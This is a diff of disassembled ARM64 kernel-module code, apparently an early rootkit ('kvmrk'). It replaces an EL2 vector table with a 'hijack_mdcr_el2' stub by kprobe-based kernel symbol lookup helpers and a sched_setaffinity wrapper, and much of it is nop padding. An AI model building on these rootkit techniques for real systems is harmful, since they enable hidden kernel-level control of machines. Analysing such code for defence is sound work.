@@ -4,569 +4,1103 @@ kvmrk.ko:     file format elf64-littleaarch64
 
 Disassembly of section .text:
 
-0000000000000000 <kvmrk_vectors>:
-   0:	14000202 	b	808 <el2_sync_invalid>
-   4:	d503201f 	nop
-   8:	d503201f 	nop
-   c:	d503201f 	nop
-  10:	d503201f 	nop
-  14:	d503201f 	nop
-  18:	d503201f 	nop
-  1c:	d503201f 	nop
-  20:	d503201f 	nop
-  24:	d503201f 	nop
-  28:	d503201f 	nop
-  2c:	d503201f 	nop
-  30:	d503201f 	nop
-  34:	d503201f 	nop
-  38:	d503201f 	nop
-  3c:	d503201f 	nop
-  40:	d503201f 	nop
-  44:	d503201f 	nop
-  48:	d503201f 	nop
-  4c:	d503201f 	nop
-  50:	d503201f 	nop
-  54:	d503201f 	nop
-  58:	d503201f 	nop
-  5c:	d503201f 	nop
-  60:	d503201f 	nop
-  64:	d503201f 	nop
-  68:	d503201f 	nop
-  6c:	d503201f 	nop
-  70:	d503201f 	nop
-  74:	d503201f 	nop
-  78:	d503201f 	nop
-  7c:	d503201f 	nop
-  80:	140001e3 	b	80c <el2_irq_invalid>
-  84:	d503201f 	nop
-  88:	d503201f 	nop
-  8c:	d503201f 	nop
-  90:	d503201f 	nop
-  94:	d503201f 	nop
-  98:	d503201f 	nop
-  9c:	d503201f 	nop
-  a0:	d503201f 	nop
-  a4:	d503201f 	nop
-  a8:	d503201f 	nop
-  ac:	d503201f 	nop
-  b0:	d503201f 	nop
-  b4:	d503201f 	nop
-  b8:	d503201f 	nop
-  bc:	d503201f 	nop
-  c0:	d503201f 	nop
-  c4:	d503201f 	nop
-  c8:	d503201f 	nop
-  cc:	d503201f 	nop
-  d0:	d503201f 	nop
-  d4:	d503201f 	nop
-  d8:	d503201f 	nop
-  dc:	d503201f 	nop
-  e0:	d503201f 	nop
-  e4:	d503201f 	nop
-  e8:	d503201f 	nop
-  ec:	d503201f 	nop
-  f0:	d503201f 	nop
-  f4:	d503201f 	nop
-  f8:	d503201f 	nop
-  fc:	d503201f 	nop
- 100:	140001c4 	b	810 <el2_fiq_invalid>
- 104:	d503201f 	nop
- 108:	d503201f 	nop
- 10c:	d503201f 	nop
- 110:	d503201f 	nop
- 114:	d503201f 	nop
- 118:	d503201f 	nop
- 11c:	d503201f 	nop
- 120:	d503201f 	nop
- 124:	d503201f 	nop
- 128:	d503201f 	nop
- 12c:	d503201f 	nop
- 130:	d503201f 	nop
- 134:	d503201f 	nop
- 138:	d503201f 	nop
- 13c:	d503201f 	nop
- 140:	d503201f 	nop
- 144:	d503201f 	nop
- 148:	d503201f 	nop
- 14c:	d503201f 	nop
- 150:	d503201f 	nop
- 154:	d503201f 	nop
- 158:	d503201f 	nop
- 15c:	d503201f 	nop
- 160:	d503201f 	nop
- 164:	d503201f 	nop
- 168:	d503201f 	nop
- 16c:	d503201f 	nop
- 170:	d503201f 	nop
- 174:	d503201f 	nop
- 178:	d503201f 	nop
- 17c:	d503201f 	nop
- 180:	140001a5 	b	814 <el2_error_invalid>
- 184:	d503201f 	nop
- 188:	d503201f 	nop
- 18c:	d503201f 	nop
- 190:	d503201f 	nop
- 194:	d503201f 	nop
- 198:	d503201f 	nop
- 19c:	d503201f 	nop
- 1a0:	d503201f 	nop
- 1a4:	d503201f 	nop
- 1a8:	d503201f 	nop
- 1ac:	d503201f 	nop
- 1b0:	d503201f 	nop
- 1b4:	d503201f 	nop
- 1b8:	d503201f 	nop
- 1bc:	d503201f 	nop
- 1c0:	d503201f 	nop
- 1c4:	d503201f 	nop
- 1c8:	d503201f 	nop
- 1cc:	d503201f 	nop
- 1d0:	d503201f 	nop
- 1d4:	d503201f 	nop
- 1d8:	d503201f 	nop
- 1dc:	d503201f 	nop
- 1e0:	d503201f 	nop
- 1e4:	d503201f 	nop
- 1e8:	d503201f 	nop
- 1ec:	d503201f 	nop
- 1f0:	d503201f 	nop
- 1f4:	d503201f 	nop
- 1f8:	d503201f 	nop
- 1fc:	d503201f 	nop
- 200:	14000182 	b	808 <el2_sync_invalid>
- 204:	d503201f 	nop
- 208:	d503201f 	nop
- 20c:	d503201f 	nop
- 210:	d503201f 	nop
- 214:	d503201f 	nop
- 218:	d503201f 	nop
- 21c:	d503201f 	nop
- 220:	d503201f 	nop
- 224:	d503201f 	nop
- 228:	d503201f 	nop
- 22c:	d503201f 	nop
- 230:	d503201f 	nop
- 234:	d503201f 	nop
- 238:	d503201f 	nop
- 23c:	d503201f 	nop
- 240:	d503201f 	nop
- 244:	d503201f 	nop
- 248:	d503201f 	nop
- 24c:	d503201f 	nop
- 250:	d503201f 	nop
- 254:	d503201f 	nop
- 258:	d503201f 	nop
- 25c:	d503201f 	nop
- 260:	d503201f 	nop
- 264:	d503201f 	nop
- 268:	d503201f 	nop
- 26c:	d503201f 	nop
- 270:	d503201f 	nop
- 274:	d503201f 	nop
- 278:	d503201f 	nop
- 27c:	d503201f 	nop
- 280:	14000163 	b	80c <el2_irq_invalid>
- 284:	d503201f 	nop
- 288:	d503201f 	nop
- 28c:	d503201f 	nop
- 290:	d503201f 	nop
- 294:	d503201f 	nop
- 298:	d503201f 	nop
- 29c:	d503201f 	nop
- 2a0:	d503201f 	nop
- 2a4:	d503201f 	nop
- 2a8:	d503201f 	nop
- 2ac:	d503201f 	nop
- 2b0:	d503201f 	nop
- 2b4:	d503201f 	nop
- 2b8:	d503201f 	nop
- 2bc:	d503201f 	nop
- 2c0:	d503201f 	nop
- 2c4:	d503201f 	nop
- 2c8:	d503201f 	nop
- 2cc:	d503201f 	nop
- 2d0:	d503201f 	nop
- 2d4:	d503201f 	nop
- 2d8:	d503201f 	nop
- 2dc:	d503201f 	nop
- 2e0:	d503201f 	nop
- 2e4:	d503201f 	nop
- 2e8:	d503201f 	nop
- 2ec:	d503201f 	nop
- 2f0:	d503201f 	nop
- 2f4:	d503201f 	nop
- 2f8:	d503201f 	nop
- 2fc:	d503201f 	nop
- 300:	14000144 	b	810 <el2_fiq_invalid>
- 304:	d503201f 	nop
- 308:	d503201f 	nop
- 30c:	d503201f 	nop
- 310:	d503201f 	nop
- 314:	d503201f 	nop
- 318:	d503201f 	nop
- 31c:	d503201f 	nop
- 320:	d503201f 	nop
- 324:	d503201f 	nop
- 328:	d503201f 	nop
- 32c:	d503201f 	nop
- 330:	d503201f 	nop
- 334:	d503201f 	nop
- 338:	d503201f 	nop
- 33c:	d503201f 	nop
- 340:	d503201f 	nop
- 344:	d503201f 	nop
- 348:	d503201f 	nop
- 34c:	d503201f 	nop
- 350:	d503201f 	nop
- 354:	d503201f 	nop
- 358:	d503201f 	nop
- 35c:	d503201f 	nop
- 360:	d503201f 	nop
- 364:	d503201f 	nop
- 368:	d503201f 	nop
- 36c:	d503201f 	nop
- 370:	d503201f 	nop
- 374:	d503201f 	nop
- 378:	d503201f 	nop
- 37c:	d503201f 	nop
- 380:	14000125 	b	814 <el2_error_invalid>
- 384:	d503201f 	nop
- 388:	d503201f 	nop
- 38c:	d503201f 	nop
- 390:	d503201f 	nop
- 394:	d503201f 	nop
- 398:	d503201f 	nop
- 39c:	d503201f 	nop
- 3a0:	d503201f 	nop
- 3a4:	d503201f 	nop
- 3a8:	d503201f 	nop
- 3ac:	d503201f 	nop
- 3b0:	d503201f 	nop
- 3b4:	d503201f 	nop
- 3b8:	d503201f 	nop
- 3bc:	d503201f 	nop
- 3c0:	d503201f 	nop
- 3c4:	d503201f 	nop
- 3c8:	d503201f 	nop
- 3cc:	d503201f 	nop
- 3d0:	d503201f 	nop
- 3d4:	d503201f 	nop
- 3d8:	d503201f 	nop
- 3dc:	d503201f 	nop
- 3e0:	d503201f 	nop
- 3e4:	d503201f 	nop
- 3e8:	d503201f 	nop
- 3ec:	d503201f 	nop
- 3f0:	d503201f 	nop
- 3f4:	d503201f 	nop
- 3f8:	d503201f 	nop
- 3fc:	d503201f 	nop
- 400:	14000100 	b	800 <handle_trap_el1>
- 404:	d503201f 	nop
- 408:	d503201f 	nop
- 40c:	d503201f 	nop
- 410:	d503201f 	nop
- 414:	d503201f 	nop
- 418:	d503201f 	nop
- 41c:	d503201f 	nop
- 420:	d503201f 	nop
- 424:	d503201f 	nop
- 428:	d503201f 	nop
- 42c:	d503201f 	nop
- 430:	d503201f 	nop
- 434:	d503201f 	nop
- 438:	d503201f 	nop
- 43c:	d503201f 	nop
- 440:	d503201f 	nop
- 444:	d503201f 	nop
- 448:	d503201f 	nop
- 44c:	d503201f 	nop
- 450:	d503201f 	nop
- 454:	d503201f 	nop
- 458:	d503201f 	nop
- 45c:	d503201f 	nop
- 460:	d503201f 	nop
- 464:	d503201f 	nop
- 468:	d503201f 	nop
- 46c:	d503201f 	nop
- 470:	d503201f 	nop
- 474:	d503201f 	nop
- 478:	d503201f 	nop
- 47c:	d503201f 	nop
- 480:	140000e7 	b	81c <el1_irq_invalid>
- 484:	d503201f 	nop
- 488:	d503201f 	nop
- 48c:	d503201f 	nop
- 490:	d503201f 	nop
- 494:	d503201f 	nop
- 498:	d503201f 	nop
- 49c:	d503201f 	nop
- 4a0:	d503201f 	nop
- 4a4:	d503201f 	nop
- 4a8:	d503201f 	nop
- 4ac:	d503201f 	nop
- 4b0:	d503201f 	nop
- 4b4:	d503201f 	nop
- 4b8:	d503201f 	nop
- 4bc:	d503201f 	nop
- 4c0:	d503201f 	nop
- 4c4:	d503201f 	nop
- 4c8:	d503201f 	nop
- 4cc:	d503201f 	nop
- 4d0:	d503201f 	nop
- 4d4:	d503201f 	nop
- 4d8:	d503201f 	nop
- 4dc:	d503201f 	nop
- 4e0:	d503201f 	nop
- 4e4:	d503201f 	nop
- 4e8:	d503201f 	nop
- 4ec:	d503201f 	nop
- 4f0:	d503201f 	nop
- 4f4:	d503201f 	nop
- 4f8:	d503201f 	nop
- 4fc:	d503201f 	nop
- 500:	140000c8 	b	820 <el1_fiq_invalid>
- 504:	d503201f 	nop
- 508:	d503201f 	nop
- 50c:	d503201f 	nop
- 510:	d503201f 	nop
- 514:	d503201f 	nop
- 518:	d503201f 	nop
- 51c:	d503201f 	nop
- 520:	d503201f 	nop
- 524:	d503201f 	nop
- 528:	d503201f 	nop
- 52c:	d503201f 	nop
- 530:	d503201f 	nop
- 534:	d503201f 	nop
- 538:	d503201f 	nop
- 53c:	d503201f 	nop
- 540:	d503201f 	nop
- 544:	d503201f 	nop
- 548:	d503201f 	nop
- 54c:	d503201f 	nop
- 550:	d503201f 	nop
- 554:	d503201f 	nop
- 558:	d503201f 	nop
- 55c:	d503201f 	nop
- 560:	d503201f 	nop
- 564:	d503201f 	nop
- 568:	d503201f 	nop
- 56c:	d503201f 	nop
- 570:	d503201f 	nop
- 574:	d503201f 	nop
- 578:	d503201f 	nop
- 57c:	d503201f 	nop
- 580:	140000a9 	b	824 <el1_error_invalid>
- 584:	d503201f 	nop
- 588:	d503201f 	nop
- 58c:	d503201f 	nop
- 590:	d503201f 	nop
- 594:	d503201f 	nop
- 598:	d503201f 	nop
- 59c:	d503201f 	nop
- 5a0:	d503201f 	nop
- 5a4:	d503201f 	nop
- 5a8:	d503201f 	nop
- 5ac:	d503201f 	nop
- 5b0:	d503201f 	nop
- 5b4:	d503201f 	nop
- 5b8:	d503201f 	nop
- 5bc:	d503201f 	nop
- 5c0:	d503201f 	nop
- 5c4:	d503201f 	nop
- 5c8:	d503201f 	nop
- 5cc:	d503201f 	nop
- 5d0:	d503201f 	nop
- 5d4:	d503201f 	nop
- 5d8:	d503201f 	nop
- 5dc:	d503201f 	nop
- 5e0:	d503201f 	nop
- 5e4:	d503201f 	nop
- 5e8:	d503201f 	nop
- 5ec:	d503201f 	nop
- 5f0:	d503201f 	nop
- 5f4:	d503201f 	nop
- 5f8:	d503201f 	nop
- 5fc:	d503201f 	nop
- 600:	14000086 	b	818 <el1_sync_invalid>
- 604:	d503201f 	nop
- 608:	d503201f 	nop
- 60c:	d503201f 	nop
- 610:	d503201f 	nop
- 614:	d503201f 	nop
- 618:	d503201f 	nop
- 61c:	d503201f 	nop
- 620:	d503201f 	nop
- 624:	d503201f 	nop
- 628:	d503201f 	nop
- 62c:	d503201f 	nop
- 630:	d503201f 	nop
- 634:	d503201f 	nop
- 638:	d503201f 	nop
- 63c:	d503201f 	nop
- 640:	d503201f 	nop
- 644:	d503201f 	nop
- 648:	d503201f 	nop
- 64c:	d503201f 	nop
- 650:	d503201f 	nop
- 654:	d503201f 	nop
- 658:	d503201f 	nop
- 65c:	d503201f 	nop
- 660:	d503201f 	nop
- 664:	d503201f 	nop
- 668:	d503201f 	nop
- 66c:	d503201f 	nop
- 670:	d503201f 	nop
- 674:	d503201f 	nop
- 678:	d503201f 	nop
- 67c:	d503201f 	nop
- 680:	14000067 	b	81c <el1_irq_invalid>
- 684:	d503201f 	nop
- 688:	d503201f 	nop
- 68c:	d503201f 	nop
- 690:	d503201f 	nop
- 694:	d503201f 	nop
- 698:	d503201f 	nop
- 69c:	d503201f 	nop
- 6a0:	d503201f 	nop
- 6a4:	d503201f 	nop
- 6a8:	d503201f 	nop
- 6ac:	d503201f 	nop
- 6b0:	d503201f 	nop
- 6b4:	d503201f 	nop
- 6b8:	d503201f 	nop
- 6bc:	d503201f 	nop
- 6c0:	d503201f 	nop
- 6c4:	d503201f 	nop
- 6c8:	d503201f 	nop
- 6cc:	d503201f 	nop
- 6d0:	d503201f 	nop
- 6d4:	d503201f 	nop
- 6d8:	d503201f 	nop
- 6dc:	d503201f 	nop
- 6e0:	d503201f 	nop
- 6e4:	d503201f 	nop
- 6e8:	d503201f 	nop
- 6ec:	d503201f 	nop
- 6f0:	d503201f 	nop
- 6f4:	d503201f 	nop
- 6f8:	d503201f 	nop
- 6fc:	d503201f 	nop
- 700:	14000048 	b	820 <el1_fiq_invalid>
- 704:	d503201f 	nop
- 708:	d503201f 	nop
- 70c:	d503201f 	nop
- 710:	d503201f 	nop
- 714:	d503201f 	nop
- 718:	d503201f 	nop
- 71c:	d503201f 	nop
- 720:	d503201f 	nop
- 724:	d503201f 	nop
- 728:	d503201f 	nop
- 72c:	d503201f 	nop
- 730:	d503201f 	nop
- 734:	d503201f 	nop
- 738:	d503201f 	nop
- 73c:	d503201f 	nop
- 740:	d503201f 	nop
- 744:	d503201f 	nop
- 748:	d503201f 	nop
- 74c:	d503201f 	nop
- 750:	d503201f 	nop
- 754:	d503201f 	nop
- 758:	d503201f 	nop
- 75c:	d503201f 	nop
- 760:	d503201f 	nop
- 764:	d503201f 	nop
- 768:	d503201f 	nop
- 76c:	d503201f 	nop
- 770:	d503201f 	nop
- 774:	d503201f 	nop
- 778:	d503201f 	nop
- 77c:	d503201f 	nop
- 780:	14000029 	b	824 <el1_error_invalid>
- 784:	d503201f 	nop
- 788:	d503201f 	nop
- 78c:	d503201f 	nop
- 790:	d503201f 	nop
- 794:	d503201f 	nop
- 798:	d503201f 	nop
- 79c:	d503201f 	nop
- 7a0:	d503201f 	nop
- 7a4:	d503201f 	nop
- 7a8:	d503201f 	nop
- 7ac:	d503201f 	nop
- 7b0:	d503201f 	nop
- 7b4:	d503201f 	nop
- 7b8:	d503201f 	nop
- 7bc:	d503201f 	nop
- 7c0:	d503201f 	nop
- 7c4:	d503201f 	nop
- 7c8:	d503201f 	nop
- 7cc:	d503201f 	nop
- 7d0:	d503201f 	nop
- 7d4:	d503201f 	nop
- 7d8:	d503201f 	nop
- 7dc:	d503201f 	nop
- 7e0:	d503201f 	nop
- 7e4:	d503201f 	nop
- 7e8:	d503201f 	nop
- 7ec:	d503201f 	nop
- 7f0:	d503201f 	nop
- 7f4:	d503201f 	nop
- 7f8:	d503201f 	nop
- 7fc:	d503201f 	nop
+0000000000000000 <rk_kallsyms_lookup_name.part.0>:
+       0:	d503201f 	nop
+       4:	d503201f 	nop
+       8:	d503233f 	paciasp
+       c:	a9bc7bfd 	stp	x29, x30, [sp, #-64]!
+      10:	910003fd 	mov	x29, sp
+      14:	a9025bf5 	stp	x21, x22, [sp, #32]
+      18:	90000015 	adrp	x21, 0 <rk_kallsyms_lookup_name.part.0>
+      1c:	f94002a2 	ldr	x2, [x21]
+      20:	a90153f3 	stp	x19, x20, [sp, #16]
+      24:	aa0003f3 	mov	x19, x0
+      28:	b40001e2 	cbz	x2, 64 <rk_kallsyms_lookup_name.part.0+0x64>
+      2c:	aa1303e0 	mov	x0, x19
+      30:	d63f0040 	blr	x2
+      34:	aa1303e1 	mov	x1, x19
+      38:	aa0003f3 	mov	x19, x0
+      3c:	aa1303e2 	mov	x2, x19
+      40:	90000000 	adrp	x0, 0 <rk_kallsyms_lookup_name.part.0>
+      44:	91000000 	add	x0, x0, #0x0
+      48:	94000000 	bl	0 <_printk>
+      4c:	aa1303e0 	mov	x0, x19
+      50:	a94153f3 	ldp	x19, x20, [sp, #16]
+      54:	a9425bf5 	ldp	x21, x22, [sp, #32]
+      58:	a8c47bfd 	ldp	x29, x30, [sp], #64
+      5c:	d50323bf 	autiasp
+      60:	d65f03c0 	ret
+      64:	910002a0 	add	x0, x21, #0x0
+      68:	f9001bf7 	str	x23, [sp, #48]
+      6c:	91002016 	add	x22, x0, #0x8
+      70:	90000017 	adrp	x23, 0 <rk_kallsyms_lookup_name.part.0>
+      74:	aa1603e0 	mov	x0, x22
+      78:	910002f7 	add	x23, x23, #0x0
+      7c:	f9001ad7 	str	x23, [x22, #48]
+      80:	94000000 	bl	0 <register_kprobe>
+      84:	37f801a0 	tbnz	w0, #31, b8 <rk_kallsyms_lookup_name.part.0+0xb8>
+      88:	f94016d4 	ldr	x20, [x22, #40]
+      8c:	aa1603e0 	mov	x0, x22
+      90:	94000000 	bl	0 <unregister_kprobe>
+      94:	90000000 	adrp	x0, 0 <rk_kallsyms_lookup_name.part.0>
+      98:	aa1703e1 	mov	x1, x23
+      9c:	aa1403e2 	mov	x2, x20
+      a0:	91000000 	add	x0, x0, #0x0
+      a4:	94000000 	bl	0 <_printk>
+      a8:	aa1403e2 	mov	x2, x20
+      ac:	f90002b4 	str	x20, [x21]
+      b0:	f9401bf7 	ldr	x23, [sp, #48]
+      b4:	17ffffde 	b	2c <rk_kallsyms_lookup_name.part.0+0x2c>
+      b8:	aa1703e1 	mov	x1, x23
+      bc:	90000000 	adrp	x0, 0 <rk_kallsyms_lookup_name.part.0>
+      c0:	92800034 	mov	x20, #0xfffffffffffffffe    	// #-2
+      c4:	91000000 	add	x0, x0, #0x0
+      c8:	94000000 	bl	0 <_printk>
+      cc:	17fffff7 	b	a8 <rk_kallsyms_lookup_name.part.0+0xa8>
 
-0000000000000800 <handle_trap_el1>:
- 800:	d69f03e0 	eret
+00000000000000d0 <rk_kprobe_get_func_addr>:
+      d0:	d503201f 	nop
+      d4:	d503201f 	nop
+      d8:	d503233f 	paciasp
+      dc:	a9bd7bfd 	stp	x29, x30, [sp, #-48]!
+      e0:	910003fd 	mov	x29, sp
+      e4:	a90153f3 	stp	x19, x20, [sp, #16]
+      e8:	92800033 	mov	x19, #0xfffffffffffffffe    	// #-2
+      ec:	b50000c0 	cbnz	x0, 104 <rk_kprobe_get_func_addr+0x34>
+      f0:	aa1303e0 	mov	x0, x19
+      f4:	a94153f3 	ldp	x19, x20, [sp, #16]
+      f8:	a8c37bfd 	ldp	x29, x30, [sp], #48
+      fc:	d50323bf 	autiasp
+     100:	d65f03c0 	ret
+     104:	90000014 	adrp	x20, 0 <rk_kallsyms_lookup_name.part.0>
+     108:	91000294 	add	x20, x20, #0x0
+     10c:	91002294 	add	x20, x20, #0x8
+     110:	f90013f5 	str	x21, [sp, #32]
+     114:	aa0003f5 	mov	x21, x0
+     118:	aa1403e0 	mov	x0, x20
+     11c:	f9001a95 	str	x21, [x20, #48]
+     120:	94000000 	bl	0 <register_kprobe>
+     124:	37f80160 	tbnz	w0, #31, 150 <rk_kprobe_get_func_addr+0x80>
+     128:	f9401693 	ldr	x19, [x20, #40]
+     12c:	aa1403e0 	mov	x0, x20
+     130:	94000000 	bl	0 <unregister_kprobe>
+     134:	aa1503e1 	mov	x1, x21
+     138:	aa1303e2 	mov	x2, x19
+     13c:	90000000 	adrp	x0, 0 <rk_kallsyms_lookup_name.part.0>
+     140:	91000000 	add	x0, x0, #0x0
+     144:	94000000 	bl	0 <_printk>
+     148:	f94013f5 	ldr	x21, [sp, #32]
+     14c:	17ffffe9 	b	f0 <rk_kprobe_get_func_addr+0x20>
+     150:	aa1503e1 	mov	x1, x21
+     154:	90000000 	adrp	x0, 0 <rk_kallsyms_lookup_name.part.0>
+     158:	92800033 	mov	x19, #0xfffffffffffffffe    	// #-2
+     15c:	91000000 	add	x0, x0, #0x0
+     160:	94000000 	bl	0 <_printk>
+     164:	f94013f5 	ldr	x21, [sp, #32]
+     168:	17ffffe2 	b	f0 <rk_kprobe_get_func_addr+0x20>
+     16c:	d503201f 	nop
 
-0000000000000804 <hijack_mdcr_el2>:
- 804:	d69f03e0 	eret
+0000000000000170 <rk_kallsyms_lookup_name>:
+     170:	d503201f 	nop
+     174:	d503201f 	nop
+     178:	b5000060 	cbnz	x0, 184 <rk_kallsyms_lookup_name+0x14>
+     17c:	92800020 	mov	x0, #0xfffffffffffffffe    	// #-2
+     180:	d65f03c0 	ret
+     184:	d503233f 	paciasp
+     188:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+     18c:	910003fd 	mov	x29, sp
+     190:	97ffff9c 	bl	0 <rk_kallsyms_lookup_name.part.0>
+     194:	a8c17bfd 	ldp	x29, x30, [sp], #16
+     198:	d50323bf 	autiasp
+     19c:	d65f03c0 	ret
 
-0000000000000808 <el2_sync_invalid>:
- 808:	14000000 	b	808 <el2_sync_invalid>
+00000000000001a0 <kvmrk_sched_setaffinity>:
+     1a0:	d503201f 	nop
+     1a4:	d503201f 	nop
+     1a8:	d503233f 	paciasp
+     1ac:	a9bd7bfd 	stp	x29, x30, [sp, #-48]!
+     1b0:	910003fd 	mov	x29, sp
+     1b4:	a90153f3 	stp	x19, x20, [sp, #16]
+     1b8:	90000013 	adrp	x19, 0 <rk_kallsyms_lookup_name.part.0>
+     1bc:	91000273 	add	x19, x19, #0x0
+     1c0:	2a0003f4 	mov	w20, w0
+     1c4:	f9404662 	ldr	x2, [x19, #136]
+     1c8:	b40000e2 	cbz	x2, 1e4 <kvmrk_sched_setaffinity+0x44>
+     1cc:	2a1403e0 	mov	w0, w20
+     1d0:	d63f0040 	blr	x2
+     1d4:	a94153f3 	ldp	x19, x20, [sp, #16]
+     1d8:	a8c37bfd 	ldp	x29, x30, [sp], #48
+     1dc:	d50323bf 	autiasp
+     1e0:	d65f03c0 	ret
+     1e4:	90000000 	adrp	x0, 0 <rk_kallsyms_lookup_name.part.0>
+     1e8:	91000000 	add	x0, x0, #0x0
+     1ec:	f90017e1 	str	x1, [sp, #40]
+     1f0:	97ffff84 	bl	0 <rk_kallsyms_lookup_name.part.0>
+     1f4:	f94017e1 	ldr	x1, [sp, #40]
+     1f8:	aa0003e2 	mov	x2, x0
+     1fc:	f9004660 	str	x0, [x19, #136]
+     200:	2a1403e0 	mov	w0, w20
+     204:	d63f0040 	blr	x2
+     208:	a94153f3 	ldp	x19, x20, [sp, #16]
+     20c:	a8c37bfd 	ldp	x29, x30, [sp], #48
+     210:	d50323bf 	autiasp
+     214:	d65f03c0 	ret
+     218:	d503201f 	nop
+     21c:	d503201f 	nop
+     220:	d503201f 	nop
+     224:	d503201f 	nop
+     228:	d503201f 	nop
+     22c:	d503201f 	nop
+     230:	d503201f 	nop
+     234:	d503201f 	nop
+     238:	d503201f 	nop
+     23c:	d503201f 	nop
+     240:	d503201f 	nop
+     244:	d503201f 	nop
+     248:	d503201f 	nop
+     24c:	d503201f 	nop
+     250:	d503201f 	nop
+     254:	d503201f 	nop
+     258:	d503201f 	nop
+     25c:	d503201f 	nop
+     260:	d503201f 	nop
+     264:	d503201f 	nop
+     268:	d503201f 	nop
+     26c:	d503201f 	nop
+     270:	d503201f 	nop
+     274:	d503201f 	nop
+     278:	d503201f 	nop
+     27c:	d503201f 	nop
+     280:	d503201f 	nop
+     284:	d503201f 	nop
+     288:	d503201f 	nop
+     28c:	d503201f 	nop
+     290:	d503201f 	nop
+     294:	d503201f 	nop
+     298:	d503201f 	nop
+     29c:	d503201f 	nop
+     2a0:	d503201f 	nop
+     2a4:	d503201f 	nop
+     2a8:	d503201f 	nop
+     2ac:	d503201f 	nop
+     2b0:	d503201f 	nop
+     2b4:	d503201f 	nop
+     2b8:	d503201f 	nop
+     2bc:	d503201f 	nop
+     2c0:	d503201f 	nop
+     2c4:	d503201f 	nop
+     2c8:	d503201f 	nop
+     2cc:	d503201f 	nop
+     2d0:	d503201f 	nop
+     2d4:	d503201f 	nop
+     2d8:	d503201f 	nop
+     2dc:	d503201f 	nop
+     2e0:	d503201f 	nop
+     2e4:	d503201f 	nop
+     2e8:	d503201f 	nop
+     2ec:	d503201f 	nop
+     2f0:	d503201f 	nop
+     2f4:	d503201f 	nop
+     2f8:	d503201f 	nop
+     2fc:	d503201f 	nop
+     300:	d503201f 	nop
+     304:	d503201f 	nop
+     308:	d503201f 	nop
+     30c:	d503201f 	nop
+     310:	d503201f 	nop
+     314:	d503201f 	nop
+     318:	d503201f 	nop
+     31c:	d503201f 	nop
+     320:	d503201f 	nop
+     324:	d503201f 	nop
+     328:	d503201f 	nop
+     32c:	d503201f 	nop
+     330:	d503201f 	nop
+     334:	d503201f 	nop
+     338:	d503201f 	nop
+     33c:	d503201f 	nop
+     340:	d503201f 	nop
+     344:	d503201f 	nop
+     348:	d503201f 	nop
+     34c:	d503201f 	nop
+     350:	d503201f 	nop
+     354:	d503201f 	nop
+     358:	d503201f 	nop
+     35c:	d503201f 	nop
+     360:	d503201f 	nop
+     364:	d503201f 	nop
+     368:	d503201f 	nop
+     36c:	d503201f 	nop
+     370:	d503201f 	nop
+     374:	d503201f 	nop
+     378:	d503201f 	nop
+     37c:	d503201f 	nop
+     380:	d503201f 	nop
+     384:	d503201f 	nop
+     388:	d503201f 	nop
+     38c:	d503201f 	nop
+     390:	d503201f 	nop
+     394:	d503201f 	nop
+     398:	d503201f 	nop
+     39c:	d503201f 	nop
+     3a0:	d503201f 	nop
+     3a4:	d503201f 	nop
+     3a8:	d503201f 	nop
+     3ac:	d503201f 	nop
+     3b0:	d503201f 	nop
+     3b4:	d503201f 	nop
+     3b8:	d503201f 	nop
+     3bc:	d503201f 	nop
+     3c0:	d503201f 	nop
+     3c4:	d503201f 	nop
+     3c8:	d503201f 	nop
+     3cc:	d503201f 	nop
+     3d0:	d503201f 	nop
+     3d4:	d503201f 	nop
+     3d8:	d503201f 	nop
+     3dc:	d503201f 	nop
+     3e0:	d503201f 	nop
+     3e4:	d503201f 	nop
+     3e8:	d503201f 	nop
+     3ec:	d503201f 	nop
+     3f0:	d503201f 	nop
+     3f4:	d503201f 	nop
+     3f8:	d503201f 	nop
+     3fc:	d503201f 	nop
+     400:	d503201f 	nop
+     404:	d503201f 	nop
+     408:	d503201f 	nop
+     40c:	d503201f 	nop
+     410:	d503201f 	nop
+     414:	d503201f 	nop
+     418:	d503201f 	nop
+     41c:	d503201f 	nop
+     420:	d503201f 	nop
+     424:	d503201f 	nop
+     428:	d503201f 	nop
+     42c:	d503201f 	nop
+     430:	d503201f 	nop
+     434:	d503201f 	nop
+     438:	d503201f 	nop
+     43c:	d503201f 	nop
+     440:	d503201f 	nop
+     444:	d503201f 	nop
+     448:	d503201f 	nop
+     44c:	d503201f 	nop
+     450:	d503201f 	nop
+     454:	d503201f 	nop
+     458:	d503201f 	nop
+     45c:	d503201f 	nop
+     460:	d503201f 	nop
+     464:	d503201f 	nop
+     468:	d503201f 	nop
+     46c:	d503201f 	nop
+     470:	d503201f 	nop
+     474:	d503201f 	nop
+     478:	d503201f 	nop
+     47c:	d503201f 	nop
+     480:	d503201f 	nop
+     484:	d503201f 	nop
+     488:	d503201f 	nop
+     48c:	d503201f 	nop
+     490:	d503201f 	nop
+     494:	d503201f 	nop
+     498:	d503201f 	nop
+     49c:	d503201f 	nop
+     4a0:	d503201f 	nop
+     4a4:	d503201f 	nop
+     4a8:	d503201f 	nop
+     4ac:	d503201f 	nop
+     4b0:	d503201f 	nop
+     4b4:	d503201f 	nop
+     4b8:	d503201f 	nop
+     4bc:	d503201f 	nop
+     4c0:	d503201f 	nop
+     4c4:	d503201f 	nop
+     4c8:	d503201f 	nop
+     4cc:	d503201f 	nop
+     4d0:	d503201f 	nop
+     4d4:	d503201f 	nop
+     4d8:	d503201f 	nop
+     4dc:	d503201f 	nop
+     4e0:	d503201f 	nop
+     4e4:	d503201f 	nop
+     4e8:	d503201f 	nop
+     4ec:	d503201f 	nop
+     4f0:	d503201f 	nop
+     4f4:	d503201f 	nop
+     4f8:	d503201f 	nop
+     4fc:	d503201f 	nop
+     500:	d503201f 	nop
+     504:	d503201f 	nop
+     508:	d503201f 	nop
+     50c:	d503201f 	nop
+     510:	d503201f 	nop
+     514:	d503201f 	nop
+     518:	d503201f 	nop
+     51c:	d503201f 	nop
+     520:	d503201f 	nop
+     524:	d503201f 	nop
+     528:	d503201f 	nop
+     52c:	d503201f 	nop
+     530:	d503201f 	nop
+     534:	d503201f 	nop
+     538:	d503201f 	nop
+     53c:	d503201f 	nop
+     540:	d503201f 	nop
+     544:	d503201f 	nop
+     548:	d503201f 	nop
+     54c:	d503201f 	nop
+     550:	d503201f 	nop
+     554:	d503201f 	nop
+     558:	d503201f 	nop
+     55c:	d503201f 	nop
+     560:	d503201f 	nop
+     564:	d503201f 	nop
+     568:	d503201f 	nop
+     56c:	d503201f 	nop
+     570:	d503201f 	nop
+     574:	d503201f 	nop
+     578:	d503201f 	nop
+     57c:	d503201f 	nop
+     580:	d503201f 	nop
+     584:	d503201f 	nop
+     588:	d503201f 	nop
